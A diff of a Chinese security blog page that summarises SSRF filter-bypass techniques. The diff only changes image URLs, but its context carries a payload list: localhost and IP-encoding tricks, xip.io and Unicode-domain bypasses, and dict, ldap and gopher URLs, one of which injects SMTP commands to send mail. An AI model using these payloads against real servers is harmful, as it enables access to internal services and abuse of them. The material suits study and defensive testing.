@@ -120,22 +120,22 @@
 <meta property="og:site_name" content="瓦都剋">
 <meta property="og:description" content="前言 昨天忘了在公众号还是微博上看到的了，看到一个SSRF绕过的技巧，使用的是ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ绕过的，自己也没遇到过。然后想想自己对SSRF绕过还是停留在之前的了解，也没学习过新的绕过方法，所以特意找了找资料，学习学习最新黑科技，充充能。">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://oa8y5guqs.bkt.clouddn.com/11.png">
-<meta property="og:image" content="http://oa8y5guqs.bkt.clouddn.com/1.png">
-<meta property="og:image" content="http://oa8y5guqs.bkt.clouddn.com/2.png">
-<meta property="og:image" content="http://oa8y5guqs.bkt.clouddn.com/3.png">
-<meta property="og:image" content="http://oa8y5guqs.bkt.clouddn.com/4.png">
-<meta property="og:image" content="http://oa8y5guqs.bkt.clouddn.com/5.png">
-<meta property="og:image" content="http://oa8y5guqs.bkt.clouddn.com/9.png">
-<meta property="og:image" content="http://oa8y5guqs.bkt.clouddn.com/6.png">
-<meta property="og:image" content="http://oa8y5guqs.bkt.clouddn.com/7.png">
-<meta property="og:image" content="http://oa8y5guqs.bkt.clouddn.com/8.png">
-<meta property="og:image" content="http://oa8y5guqs.bkt.clouddn.com/10.png">
-<meta property="og:updated_time" content="2017-11-22T07:11:21.000Z">
+<meta property="og:image" content="http://blog.w2n1ck.com/11.png">
+<meta property="og:image" content="http://blog.w2n1ck.com/1.png">
+<meta property="og:image" content="http://blog.w2n1ck.com/2.png">
+<meta property="og:image" content="http://blog.w2n1ck.com/3.png">
+<meta property="og:image" content="http://blog.w2n1ck.com/4.png">
+<meta property="og:image" content="http://blog.w2n1ck.com/5.png">
+<meta property="og:image" content="http://blog.w2n1ck.com/9.png">
+<meta property="og:image" content="http://blog.w2n1ck.com/6.png">
+<meta property="og:image" content="http://blog.w2n1ck.com/7.png">
+<meta property="og:image" content="http://blog.w2n1ck.com/8.png">
+<meta property="og:image" content="http://blog.w2n1ck.com/10.png">
+<meta property="og:updated_time" content="2018-12-14T05:54:13.304Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="SSRF绕过方法总结">
 <meta name="twitter:description" content="前言 昨天忘了在公众号还是微博上看到的了，看到一个SSRF绕过的技巧，使用的是ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ绕过的，自己也没遇到过。然后想想自己对SSRF绕过还是停留在之前的了解，也没学习过新的绕过方法，所以特意找了找资料，学习学习最新黑科技，充充能。">
-<meta name="twitter:image" content="http://oa8y5guqs.bkt.clouddn.com/11.png">
+<meta name="twitter:image" content="http://blog.w2n1ck.com/11.png">
 
 
 
@@ -501,26 +501,26 @@
 <p>以上这些不是本文的重点，下面说下重点介绍的SSRF绕过的方法。</p>
 <h1 id="0x03-SSRF怎么绕"><a href="#0x03-SSRF怎么绕" class="headerlink" title="0x03 SSRF怎么绕"></a>0x03 SSRF怎么绕</h1><h2 id="1、攻击本地"><a href="#1、攻击本地" class="headerlink" title="1、攻击本地"></a>1、攻击本地</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1:80</div><div class="line">http://localhost:22</div></pre></td></tr></table></figure>
 <h2 id="2、利用"><a href="#2、利用" class="headerlink" title="2、利用[::]"></a>2、利用<code>[::]</code></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">利用[::]绕过localhost</div><div class="line">http://[::]:80/  &gt;&gt;&gt;  http://127.0.0.1</div><div class="line">也有看到利用http://0000::1:80/的，但是我测试未成功</div></pre></td></tr></table></figure>
-<p><img src="http://oa8y5guqs.bkt.clouddn.com/11.png" alt=""></p>
+<p><img src="http://blog.w2n1ck.com/11.png" alt=""></p>
 <h2 id="3、利用"><a href="#3、利用" class="headerlink" title="3、利用@"></a>3、利用<code>@</code></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://example.com@127.0.0.1</div></pre></td></tr></table></figure>
 <h2 id="4、利用短地址"><a href="#4、利用短地址" class="headerlink" title="4、利用短地址"></a>4、利用短地址</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://dwz.cn/11SMa  &gt;&gt;&gt;  http://127.0.0.1</div></pre></td></tr></table></figure>
 <h2 id="5、利用特殊域名"><a href="#5、利用特殊域名" class="headerlink" title="5、利用特殊域名"></a>5、利用特殊域名</h2><p>利用的原理是DNS解析<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1.xip.io/</div></pre></td></tr></table></figure></p>
-<p><img src="http://oa8y5guqs.bkt.clouddn.com/1.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.owasp.org.127.0.0.1.xip.io/</div></pre></td></tr></table></figure></p>
-<p><img src="http://oa8y5guqs.bkt.clouddn.com/2.png" alt=""></p>
+<p><img src="http://blog.w2n1ck.com/1.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.owasp.org.127.0.0.1.xip.io/</div></pre></td></tr></table></figure></p>
+<p><img src="http://blog.w2n1ck.com/2.png" alt=""></p>
 <h2 id="6、利用DNS解析"><a href="#6、利用DNS解析" class="headerlink" title="6、利用DNS解析"></a>6、利用DNS解析</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">在域名上设置A记录，指向127.0.1</div></pre></td></tr></table></figure>
-<p><img src="http://oa8y5guqs.bkt.clouddn.com/3.png" alt=""></p>
+<p><img src="http://blog.w2n1ck.com/3.png" alt=""></p>
 <h2 id="7、利用上传"><a href="#7、利用上传" class="headerlink" title="7、利用上传"></a>7、利用上传</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">也不一定是上传，我也说不清，自己体会 -.-</div><div class="line">修改&quot;type=file&quot;为&quot;type=url&quot;</div><div class="line">比如：</div><div class="line">上传图片处修改上传，将图片文件修改为URL，即可能触发SSRF</div></pre></td></tr></table></figure>
 <h2 id="8、利用Enclosed-alphanumerics"><a href="#8、利用Enclosed-alphanumerics" class="headerlink" title="8、利用Enclosed alphanumerics"></a>8、利用Enclosed alphanumerics</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">利用Enclosed alphanumerics</div><div class="line">ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  &gt;&gt;&gt;  example.com</div><div class="line">List:</div><div class="line">① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</div></pre></td></tr></table></figure>
-<p><img src="http://oa8y5guqs.bkt.clouddn.com/4.png" alt=""></p>
+<p><img src="http://blog.w2n1ck.com/4.png" alt=""></p>
 <h2 id="9、利用句号"><a href="#9、利用句号" class="headerlink" title="9、利用句号"></a>9、利用句号</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">127。0。0。1  &gt;&gt;&gt;  127.0.0.1</div></pre></td></tr></table></figure>
-<p><img src="http://oa8y5guqs.bkt.clouddn.com/5.png" alt=""></p>
+<p><img src="http://blog.w2n1ck.com/5.png" alt=""></p>
 <h2 id="10、利用进制转换"><a href="#10、利用进制转换" class="headerlink" title="10、利用进制转换"></a>10、利用进制转换</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">可以是十六进制，八进制等。</div><div class="line">115.239.210.26  &gt;&gt;&gt;  16373751032</div><div class="line">首先把这四段数字给分别转成16进制，结果：73 ef d2 1a</div><div class="line">然后把 73efd21a 这十六进制一起转换成8进制</div><div class="line">记得访问的时候加0表示使用八进制(可以是一个0也可以是多个0 跟XSS中多加几个0来绕过过滤一样)，十六进制加0x</div></pre></td></tr></table></figure>
-<p><img src="http://oa8y5guqs.bkt.clouddn.com/9.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1  &gt;&gt;&gt;  http://0177.0.0.1/</div></pre></td></tr></table></figure></p>
-<p><img src="http://oa8y5guqs.bkt.clouddn.com/6.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1  &gt;&gt;&gt;  http://2130706433/</div></pre></td></tr></table></figure></p>
-<p><img src="http://oa8y5guqs.bkt.clouddn.com/7.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://192.168.0.1  &gt;&gt;&gt;  http://3232235521/</div><div class="line">http://192.168.1.1  &gt;&gt;&gt;  http://3232235777/</div></pre></td></tr></table></figure></p>
-<p><img src="http://oa8y5guqs.bkt.clouddn.com/8.png" alt=""></p>
+<p><img src="http://blog.w2n1ck.com/9.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1  &gt;&gt;&gt;  http://0177.0.0.1/</div></pre></td></tr></table></figure></p>
+<p><img src="http://blog.w2n1ck.com/6.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1  &gt;&gt;&gt;  http://2130706433/</div></pre></td></tr></table></figure></p>
+<p><img src="http://blog.w2n1ck.com/7.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://192.168.0.1  &gt;&gt;&gt;  http://3232235521/</div><div class="line">http://192.168.1.1  &gt;&gt;&gt;  http://3232235777/</div></pre></td></tr></table></figure></p>
+<p><img src="http://blog.w2n1ck.com/8.png" alt=""></p>
 <h2 id="11、利用特殊地址"><a href="#11、利用特殊地址" class="headerlink" title="11、利用特殊地址"></a>11、利用特殊地址</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://0/</div></pre></td></tr></table></figure>
-<p><img src="http://oa8y5guqs.bkt.clouddn.com/10.png" alt=""></p>
+<p><img src="http://blog.w2n1ck.com/10.png" alt=""></p>
 <h2 id="12、利用协议"><a href="#12、利用协议" class="headerlink" title="12、利用协议"></a>12、利用协议</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">Dict://</div><div class="line">dict://&lt;user-auth&gt;@&lt;host&gt;:&lt;port&gt;/d:&lt;word&gt;</div><div class="line">ssrf.php?url=dict://attacker:11111/</div><div class="line">SFTP://</div><div class="line">ssrf.php?url=sftp://example.com:11111/</div><div class="line">TFTP://</div><div class="line">ssrf.php?url=tftp://example.com:12346/TESTUDPPACKET</div><div class="line">LDAP://</div><div class="line">ssrf.php?url=ldap://localhost:11211/%0astats%0aquit</div><div class="line">Gopher://</div><div class="line">ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a</div></pre></td></tr></table></figure>
 <h2 id="13、使用组合"><a href="#13、使用组合" class="headerlink" title="13、使用组合"></a>13、使用组合</h2><p>各种绕过的组合即可</p>
 <h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><p><a href="https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF" target="_blank" rel="external">https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF</a><br><a href="https://twitter.com/albinowax/status/890725759861403648" target="_blank" rel="external">https://twitter.com/albinowax/status/890725759861403648</a><br><a href="http://blog.safebuff.com/2016/07/03/SSRF-Tips/" target="_blank" rel="external">http://blog.safebuff.com/2016/07/03/SSRF-Tips/</a><br><a href="https://hackerone.com/reports/115748" target="_blank" rel="external">https://hackerone.com/reports/115748</a><br><a href="https://www.dailysecurity.fr/server-side-request-forgery/" target="_blank" rel="external">https://www.dailysecurity.fr/server-side-request-forgery/</a><br><a href="https://twitter.com/EdOverflow" target="_blank" rel="external">https://twitter.com/EdOverflow</a><br><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SSRF%20injection" target="_blank" rel="external">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SSRF%20injection</a><br><a href="http://www.agarri.fr/docs/AppSecEU15-Server_side_browsing_considered_harmful.pdf" target="_blank" rel="external">http://www.agarri.fr/docs/AppSecEU15-Server_side_browsing_considered_harmful.pdf</a><br><a href="http://byd.dropsec.xyz/2017/06/04/SSRF%E6%BC%8F%E6%B4%9E%E5%89%96%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/">http://byd.dropsec.xyz/2017/06/04/SSRF%E6%BC%8F%E6%B4%9E%E5%89%96%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/</a><br><a href="http://blog.csdn.net/xinianbuxiu/article/details/53560417" target="_blank" rel="external">http://blog.csdn.net/xinianbuxiu/article/details/53560417</a></p>
